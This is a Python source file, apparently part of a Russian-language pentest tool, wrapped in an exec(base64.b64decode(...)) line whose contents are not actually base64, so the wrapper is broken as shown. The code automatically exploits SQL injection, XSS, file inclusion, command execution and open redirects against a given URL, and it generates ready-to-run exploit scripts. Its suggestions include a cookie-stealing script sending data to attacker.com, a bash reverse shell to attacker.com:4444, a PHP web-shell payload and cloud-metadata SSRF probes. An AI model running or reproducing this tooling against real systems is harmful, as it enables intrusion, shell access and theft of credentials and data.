import base64;exec(base64.b64decode('import requests
import socket
import time
import base64
import re
from urllib.parse import urlparse, quote, urljoin
from BruhPentest.utils import get_random_user_agent


class ExploitScanner:
    def __init__(self):
        self.sess = requests.Session()
        self.sess.headers.update({'User-Agent': get_random_user_agent()})

    def hit_endpoint(self, url, method="GET", data=None, headers=None, follow_redirects=True, verify=False, timeout=10):
        try:
            browser = {'User-Agent': get_random_user_agent()}
            if headers:
                browser.update(headers)

            if method.upper() == "GET":
                resp = self.sess.get(
                    url,
                    headers=browser,
                    allow_redirects=follow_redirects,
                    verify=verify,
                    timeout=timeout
                )
            elif method.upper() == "POST":
                resp = self.sess.post(
                    url,
                    data=data,
                    headers=browser,
                    allow_redirects=follow_redirects,
                    verify=verify,
                    timeout=timeout
                )
            elif method.upper() == "HEAD":
                resp = self.sess.head(
                    url,
                    headers=browser,
                    allow_redirects=follow_redirects,
                    verify=verify,
                    timeout=timeout
                )
            else:
                return None

            return resp
        except requests.RequestException:
            return None

    def pwn_sql_injection(self, endpoint):
        url = endpoint["url"]
        param = endpoint["param"]
        method = endpoint.get("type", "GET")

        payload = "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --"
        if method == "GET":
            base_url = url.split('?')[0]
            test_url = f"{base_url}?{param}={quote(payload)}"
            resp = self.hit_endpoint(test_url)
        else:
            form_data = {param: payload}
            resp = self.hit_endpoint(url, method="POST", data=form_data)

        if resp and any(str(i) in resp.text for i in range(1, 11)):
            db_payload = "' UNION SELECT 1,database(),3,4,5,6,7,8,9,10 --"
            if method == "GET":
                base_url = url.split('?')[0]
                test_url = f"{base_url}?{param}={quote(db_payload)}"
                resp = self.hit_endpoint(test_url)
            else:
                form_data = {param: db_payload}
                resp = self.hit_endpoint(url, method="POST", data=form_data)

            db_name = re.search(r'>\s*([a-zA-Z0-9_]+)\s*<', resp.text)

            return {
                "success": True,
                "database": db_name.group(1) if db_name else "Unknown",
                "payload": db_payload,
                "url": test_url if method == "GET" else url
            }

        return {"success": False}

    def pwn_xss(self, endpoint):
        url = endpoint["url"]
        param = endpoint["param"]
        payload = endpoint["payload"]
        method = endpoint.get("type", "GET")

        encoded_payload = quote("<img src=x onerror=console.log('XSS_VULN_CONFIRMED')>")
        if method == "GET":
            base_url = url.split('?')[0]
            test_url = f"{base_url}?{param}={encoded_payload}"
            resp = self.hit_endpoint(test_url)
        else:
            form_data = {param: encoded_payload}
            resp = self.hit_endpoint(url, method="POST", data=form_data)

        if resp and "XSS_VULN_CONFIRMED" in resp.text:
            return {
                "success": True,
                "payload": encoded_payload,
                "url": test_url if method == "GET" else url
            }

        return {"success": False}

    def pwn_lfi(self, endpoint):
        url = endpoint["url"]
        param = endpoint["param"]

        payloads = [
            "../../../etc/passwd",
            "../../../Windows/win.ini",
            "php://filter/convert.base64-encode/resource=index.php"
        ]

        for payload in payloads:
            base_url = url.split('?')[0]
            test_url = f"{base_url}?{param}={quote(payload)}"
            resp = self.hit_endpoint(test_url)

            if resp:
                if "root:x:" in resp.text or "[fonts]" in resp.text:
                    return {
                        "success": True,
                        "payload": payload,
                        "url": test_url,
                        "content": resp.text[:500]
                    }
                elif "php://filter" in payload and len(resp.text) > 100:
                    try:
                        decoded = base64.b64decode(resp.text.strip())
                        if b"<?php" in decoded:
                            return {
                                "success": True,
                                "payload": payload,
                                "url": test_url,
                                "content": decoded[:500]
                            }
                    except:
                        pass

        return {"success": False}

    def pwn_rce(self, endpoint):
        url = endpoint["url"]
        param = endpoint["param"]

        payloads = [
            "id",
            "whoami",
            "uname -a"
        ]

        for payload in payloads:
            base_url = url.split('?')[0]
            test_url = f"{base_url}?{param}={quote(payload)}"
            resp = self.hit_endpoint(test_url)

            if resp and any(indicator in resp.text for indicator in ["uid=", "gid=", "Linux", "Windows"]):
                return {
                    "success": True,
                    "payload": payload,
                    "url": test_url,
                    "output": resp.text.strip()[:500]
                }

        return {"success": False}

    def pwn_open_redirect(self, endpoint):
        url = endpoint["url"]
        param = endpoint["param"]

        destination = "https://example.com"
        base_url = url.split('?')[0]
        test_url = f"{base_url}?{param}={quote(destination)}"
        resp = self.hit_endpoint(test_url, follow_redirects=False)

        if resp and resp.status_code in [301, 302, 303, 307, 308]:
            location = resp.headers.get('Location', '')
            if destination in location:
                return {
                    "success": True,
                    "payload": destination,
                    "url": test_url,
                    "redirect_to": location
                }

        return {"success": False}

    def exploit_vulnerabilities(self, url, scan_results):
        print(f"[*] Запускаем генерацию эксплойтов для: {url}")

        exploits = []
        auto_exploits_results = []

        if scan_results.get("sql_injection", {}).get("vulnerable", False):
            print(f"[*] Генерим эксплойты для SQL инъекций...")
            for endpoint in scan_results["sql_injection"]["endpoints"]:
                print(f"[+] Генерю эксплойт для SQL инъекции: {endpoint['url']}")
                exploits.append({
                    "vulnerability": "SQL Injection",
                    "url": endpoint["url"],
                    "payload": endpoint["payload"],
                    "exploitation": f"Вот что можно попробовать:\n1. {endpoint['payload']}\n2. UNION SELECT запросы\n3. Внедрение DBMS-специфичных функций"
                })

                print(f"[*] Пробуем авто-эксплуатировать SQL инъекцию...")
                result = self.pwn_sql_injection(endpoint)
                if result["success"]:
                    print(f"[+] Ура! SQL инъекция сработала!")
                    print(f"[+] База данных: {result.get('database', 'Unknown')}")
                    auto_exploits_results.append({
                        "vulnerability": "SQL Injection",
                        "url": endpoint["url"],
                        "auto_exploit_result": result
                    })
                else:
                    print(f"[-] Не вышло с автоматической эксплуатацией SQL инъекции")

        if scan_results.get("xss", {}).get("vulnerable", False):
            print(f"[*] Генерим эксплойты для XSS...")
            for endpoint in scan_results["xss"]["endpoints"]:
                print(f"[+] Генерю эксплойт для XSS: {endpoint['url']}")
                exploits.append({
                    "vulnerability": "Cross-Site Scripting",
                    "url": endpoint["url"],
                    "payload": endpoint["payload"],
                    "exploitation": f"Попробуй эти нагрузки:\n1. {endpoint['payload']}\n2. <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>\n3. <img src=x onerror=alert(document.cookie)>"
                })

                print(f"[*] Пробуем авто-эксплуатировать XSS...")
                result = self.pwn_xss(endpoint)
                if result["success"]:
                    print(f"[+] Ура! XSS сработал!")
                    auto_exploits_results.append({
                        "vulnerability": "Cross-Site Scripting",
                        "url": endpoint["url"],
                        "auto_exploit_result": result
                    })
                else:
                    print(f"[-] Не вышло с автоматической эксплуатацией XSS")

        if scan_results.get("lfi", {}).get("vulnerable", False):
            print(f"[*] Генерим эксплойты для LFI...")
            for endpoint in scan_results["lfi"]["endpoints"]:
                print(f"[+] Генерю эксплойт для LFI: {endpoint['url']}")
                exploits.append({
                    "vulnerability": "Local File Inclusion",
                    "url": endpoint["url"],
                    "payload": endpoint["payload"],
                    "poc": self.generate_lfi_poc(url),
                    "exploitation": f"Попробуй эти нагрузки:\n1. {endpoint['payload']}\n2. Чтение системных файлов (/etc/passwd, /etc/shadow)\n3. Использование обертки (php://filter/convert.base64-encode/resource=index.php)"
                })

                print(f"[*] Пробуем авто-эксплуатировать LFI...")
                result = self.pwn_lfi(endpoint)
                if result["success"]:
                    print(f"[+] Ура! LFI сработал!")
                    print(f"[+] Контент файла: {result.get('content', '')[:100]}...")
                    auto_exploits_results.append({
                        "vulnerability": "Local File Inclusion",
                        "url": endpoint["url"],
                        "auto_exploit_result": result
                    })
                else:
                    print(f"[-] Не вышло с автоматической эксплуатацией LFI")

        if scan_results.get("rce", {}).get("vulnerable", False):
            print(f"[*] Генерим эксплойты для RCE...")
            for endpoint in scan_results["rce"]["endpoints"]:
                print(f"[+] Генерю эксплойт для RCE: {endpoint['url']}")
                exploits.append({
                    "vulnerability": "Remote Code Execution",
                    "url": endpoint["url"],
                    "payload": endpoint["payload"],
                    "poc": self.generate_rce_poc(url),
                    "exploitation": f"Попробуй эти нагрузки:\n1. {endpoint['payload']}\n2. Обход фильтров (cat${IFS}/etc/passwd)\n3. Использование шеллкода (bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1')"
                })

                print(f"[*] Пробуем авто-эксплуатировать RCE...")
                result = self.pwn_rce(endpoint)
                if result["success"]:
                    print(f"[+] Ура! RCE сработал!")
                    print(f"[+] Вывод команды: {result.get('output', '')[:100]}...")
                    auto_exploits_results.append({
                        "vulnerability": "Remote Code Execution",
                        "url": endpoint["url"],
                        "auto_exploit_result": result
                    })
                else:
                    print(f"[-] Не вышло с автоматической эксплуатацией RCE")

        if scan_results.get("open_redirect", {}).get("vulnerable", False):
            print(f"[*] Генерим эксплойты для Open Redirect...")
            for endpoint in scan_results["open_redirect"]["endpoints"]:
                print(f"[+] Генерю эксплойт для Open Redirect: {endpoint['url']}")
                exploits.append({
                    "vulnerability": "Open Redirect",
                    "url": endpoint["url"],
                    "payload": endpoint["payload"],
                    "poc": self.generate_redirect_poc(url),
                    "exploitation": f"Попробуй эти нагрузки:\n1. {endpoint['payload']}\n2. javascript:alert(document.domain)\n3. data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
                })

                print(f"[*] Пробуем авто-эксплуатировать Open Redirect...")
                result = self.pwn_open_redirect(endpoint)
                if result["success"]:
                    print(f"[+] Ура! Open Redirect сработал!")
                    print(f"[+] Редирект на: {result.get('redirect_to', '')}")
                    auto_exploits_results.append({
                        "vulnerability": "Open Redirect",
                        "url": endpoint["url"],
                        "auto_exploit_result": result
                    })
                else:
                    print(f"[-] Не вышло с автоматической эксплуатацией Open Redirect")

        for vulnerability_type in ["Server-Side Template Injection", "CORS Misconfiguration",
                                   "Server-Side Request Forgery"]:
            print(f"[*] Проверяем наличие {vulnerability_type}...")

            if vulnerability_type == "Server-Side Template Injection":
                exploits.append({
                    "vulnerability": vulnerability_type,
                    "url": url,
                    "poc": self.generate_ssti_poc(url),
                    "exploitation": "1. Потестируй шаблонные выражения ({{7*7}}, ${7*7})\n2. Проверь наличие фреймворков (Jinja2, Twig, FreeMarker)\n3. Эксплуатация через RCE или чтение файлов"
                })
            elif vulnerability_type == "CORS Misconfiguration":
                exploits.append({
                    "vulnerability": vulnerability_type,
                    "url": url,
                    "poc": self.generate_cors_poc(url),
                    "exploitation": "1. Проверь заголовок Access-Control-Allow-Origin\n2. Проверь заголовок Access-Control-Allow-Credentials\n3. Эксплуатация через перехват данных с origin злоумышленника"
                })
            elif vulnerability_type == "Server-Side Request Forgery":
                exploits.append({
                    "vulnerability": vulnerability_type,
                    "url": url,
                    "poc": self.generate_ssrf_poc(url),
                    "exploitation": "1. Проверь доступ к localhost и внутренним ресурсам\n2. Проверь доступ к метаданным облачных сервисов\n3. Эксплуатация через доступ к внутренним сервисам"
                })

        print(f"[+] Готово с генерацией эксплойтов!")
        print(f"[+] Результаты автоматической эксплуатации: {len(auto_exploits_results)} успешных эксплойтов")

        return {
            "exploits": exploits,
            "auto_exploits_results": auto_exploits_results
        }

    def generate_lfi_poc(self, url):
        return f"""#!/usr/bin/env python3
# Local File Inclusion PoC для {url}


import requests
from urllib.parse import quote

target_url = "{url}"
payloads = [
    "../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../etc/passwd%00",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
]


def exploit_lfi():
    print(f"[*] Начинаем эксплуатацию LFI на {{target_url}}")
    for payload in payloads:
        test_url = f"{{target_url}}?file={{quote(payload)}}"
        print(f"[*] Тестим URL: {{test_url}}")

        try:
            response = requests.get(test_url, verify=False)
            if "root:x:" in response.text or "localhost" in response.text or "<?php" in response.text:
                print(f"[+] LFI сработало! Payload: {{payload}}")
                print(f"[+] URL: {{test_url}}")
                print(f"[+] Вывод:")
                print("-----------------------------------")
                print(response.text[:500] + "..." if len(response.text) > 500 else response.text)
                print("-----------------------------------")
                return True
        except Exception as e:
            print(f"[-] Ошибка: {{str(e)}}")

    print("[-] LFI эксплуатация не удалась")
    return False


if __name__ == "__main__":
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    exploit_lfi()
"""

    def generate_rce_poc(self, url):
        return f"""#!/usr/bin/env python3
# Remote Code Execution PoC для {url}


import requests
from urllib.parse import quote
import time

target_url = "{url}"
payloads = [
    "id",
    "whoami",
    "uname -a",
    "ls -la",
    ";id;",
    "& whoami &",
    "| cat /etc/passwd",
    "sleep 5"
]
indicators = ["uid=", "gid=", "root:x:", "Linux", "Windows"]


def exploit_rce():
    print(f"[*] Начинаем эксплуатацию RCE на {{target_url}}")
    for payload in payloads:
        test_url = f"{{target_url}}?cmd={{quote(payload)}}"
        print(f"[*] Тестим URL: {{test_url}}")

        try:
            start_time = time.time()
            response = requests.get(test_url, verify=False)
            end_time = time.time()

            if any(indicator in response.text for indicator in indicators):
                print(f"[+] RCE сработало! Payload: {{payload}}")
                print(f"[+] URL: {{test_url}}")
                print(f"[+] Вывод:")
                print("-----------------------------------")
                print(response.text[:500] + "..." if len(response.text) > 500 else response.text)
                print("-----------------------------------")
                return True

            if payload == "sleep 5" and (end_time - start_time > 4.5):
                print(f"[+] RCE сработало (тайм-бейзд)! Payload: {{payload}}")
                print(f"[+] URL: {{test_url}}")
                return True
        except Exception as e:
            print(f"[-] Ошибка: {{str(e)}}")

    print("[-] RCE эксплуатация не удалась")
    return False


if __name__ == "__main__":
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    exploit_rce()
"""

    def generate_redirect_poc(self, url):
        return f"""#!/usr/bin/env python3
# Open Redirect PoC для {url}


import requests
from urllib.parse import quote

target_url = "{url}"
payloads = [
    "https://example.com",
    "//example.com",
    "\\\\example.com",
    "example.com",
    "%2F%2Fexample.com",
    "javascript:alert(document.domain)"
]


def exploit_redirect():
    print(f"[*] Начинаем эксплуатацию Open Redirect на {{target_url}}")
    for payload in payloads:
        test_url = f"{{target_url}}?redirect={{quote(payload)}}"
        print(f"[*] Тестим URL: {{test_url}}")

        try:
            response = requests.get(test_url, allow_redirects=False, verify=False)
            if response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get('Location', '')
                if 'example.com' in location or 'javascript:' in location:
                    print(f"[+] Open Redirect сработал! Payload: {{payload}}")
                    print(f"[+] URL: {{test_url}}")
                    print(f"[+] Редирект на: {{location}}")
                    return True
        except Exception as e:
            print(f"[-] Ошибка: {{str(e)}}")

    print("[-] Open Redirect эксплуатация не удалась")
    return False


if __name__ == "__main__":
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    exploit_redirect()
"""

    def generate_ssti_poc(self, url):
        return f"""#!/usr/bin/env python3
# Server-Side Template Injection PoC для {url}


import requests
from urllib.parse import quote

target_url = "{url}"
payloads = [
    "${{7*7}}",
    "{{{{7*7}}}}",
    "<%= 7*7 %>",
    "${{{{7*7}}}}",
    "#{{7*7}}",
    "*{{7*7}}",
    "${{\"z\".join(\"ab\")}}"
]
indicators = ["49", "abz"]


def exploit_ssti():
    print(f"[*] Начинаем эксплуатацию SSTI на {{target_url}}")
    for payload in payloads:
        test_url = f"{{target_url}}?q={{quote(payload)}}"
        print(f"[*] Тестим URL: {{test_url}}")

        try:
            response = requests.get(test_url, verify=False)
            if any(indicator in response.text for indicator in indicators):
                print(f"[+] SSTI сработал! Payload: {{payload}}")
                print(f"[+] URL: {{test_url}}")
                return True
        except Exception as e:
            print(f"[-] Ошибка: {{str(e)}}")

    print("[-] SSTI эксплуатация не удалась")
    return False


if __name__ == "__main__":
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    exploit_ssti()
"""

    def generate_cors_poc(self, url):
        return f"""#!/usr/bin/env python3
# CORS Misconfiguration PoC для {url}


import requests

target_url = "{url}"


def exploit_cors():
    print(f"[*] Начинаем эксплуатацию CORS Misconfiguration на {{target_url}}")

    headers = {{
        'Origin': 'https://evil-example.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
    }}

    try:
        response = requests.get(target_url, headers=headers, verify=False)

        if 'Access-Control-Allow-Origin' in response.headers:
            acao = response.headers['Access-Control-Allow-Origin']
            print(f"[+] Access-Control-Allow-Origin: {{acao}}")

            if acao == '*' or 'evil-example.com' in acao:
                print(f"[+] CORS Misconfiguration нашлась!")
                print("[+] HTML-страница для эксплуатации:")

                exploit_html = f'''
<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploitation Demo</title>
</head>
<body>
    <h1>CORS Exploitation Demo</h1>
    <div id="output">Loading...</div>

    <script>
        document.getElementById('output').innerHTML = 'Sending request to {url}...';

        fetch('{url}', {{
            method: 'GET',
            credentials: 'include'
        }})
        .then(response => response.text())
        .then(data => {{
            document.getElementById('output').innerHTML = 'Received data:<br>' + 
                                                         '<textarea rows="10" cols="50">' + 
                                                         data.substring(0, 500) + 
                                                         '...</textarea>';
        }})
        .catch(error => {{
            document.getElementById('output').innerHTML = 'Error: ' + error;
        }});
    </script>
</body>
</html>
'''
                print("-----------------------------------")
                print(exploit_html)
                print("-----------------------------------")
                return True
    except Exception as e:
        print(f"[-] Ошибка: {{str(e)}}")

    print("[-] CORS Misconfiguration эксплуатация не удалась")
    return False


if __name__ == "__main__":
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    exploit_cors()
"""

    def generate_ssrf_poc(self, url):
        return f"""#!/usr/bin/env python3
# Server-Side Request Forgery PoC для {url}


import requests
from urllib.parse import quote

target_url = "{url}"
payloads = [
    "http://localhost",
    "http://127.0.0.1",
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd"
]
indicators = [
    "Connection refused",
    "SSH",
    "mysql",
    "ami-id",
    "instance-id",
    "root:x:"
]


def exploit_ssrf():
    print(f"[*] Начинаем эксплуатацию SSRF на {{target_url}}")
    for payload in payloads:
        for param in ['url', 'uri', 'link', 'src', 'dest', 'redirect']:
            test_url = f"{{target_url}}?{{param}}={{quote(payload)}}"
            print(f"[*] Тестим URL: {{test_url}}")

            try:
                response = requests.get(test_url, verify=False)
                for indicator in indicators:
                    if indicator in response.text:
                        print(f"[+] SSRF сработал! Payload: {{payload}}")
                        print(f"[+] URL: {{test_url}}")
                        print(f"[+] Индикатор: {{indicator}}")
                        return True
            except Exception as e:
                print(f"[-] Ошибка: {{str(e)}}")

    print("[-] SSRF эксплуатация не удалась")
    return False


if __name__ == "__main__":
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    exploit_ssrf()
"""

    def generate_generic_poc(self, url, vuln_type):
        return f"""#!/usr/bin/env python3
# {vuln_type} PoC для {url}


import requests
from urllib.parse import quote

target_url = "{url}"


def check_vulnerability():
    print(f"[*] Проверяем {vuln_type} на {{target_url}}")

    try:
        response = requests.get(target_url, verify=False)
        print(f"[*] Получен ответ: HTTP {{response.status_code}}")

        print("[+] Потенциальная уязвимость найдена!")
        print("[*] Для эксплуатации требуется дополнительный анализ.")
        return True
    except Exception as e:
        print(f"[-] Ошибка: {{str(e)}}")

    return False


if __name__ == "__main__":
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    check_vulnerability()
"""').decode('utf-8'))